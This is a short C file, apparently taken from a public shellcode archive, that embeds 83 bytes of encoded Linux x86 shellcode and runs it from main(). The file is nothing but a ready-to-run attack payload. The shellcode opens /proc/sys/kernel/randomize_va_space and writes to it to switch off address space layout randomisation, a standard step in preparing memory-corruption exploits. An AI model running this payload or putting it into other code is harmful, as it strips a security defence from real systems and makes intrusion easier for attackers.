/*
Title:	Linux x86 ASLR deactivation - 83 bytes
Author:	Jean Pascal Pereira <pereira@secbiz.de>
Web:	http://0xffe4.org
Original website: http://shell-storm.org/shellcode/files/shellcode-813.php

*/

#include <stdio.h>
#include <string.h>

char shellcode[] = "\x29\xc0\x50\x68\x70\x61\x63\x65\x68\x76\x61\x5f\x73\x68\x69\x7a\x65\x5f\x68\x6e\x64\x6f\x6d\x68\x6c\x2f\x72\x61\x68\x65\x72\x6e\x65\x68\x79\x73\x2f\x6b\x68\x6f\x63\x2f\x73\x68\x2f\x2f\x70\x72\x89\xe3\x66\xb9\xbc\x02\xb0\x08\xcd\x80\x93\x50\x66\xba\x30\x3a\x66\x52\x89\xe1\x29\xd2\x42\x6a\x03\x58\x40\xcd\x80\xb0\x06\xcd\x80\x40\xcd\x80";


int main()
{
  fprintf(stdout,"Length: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}
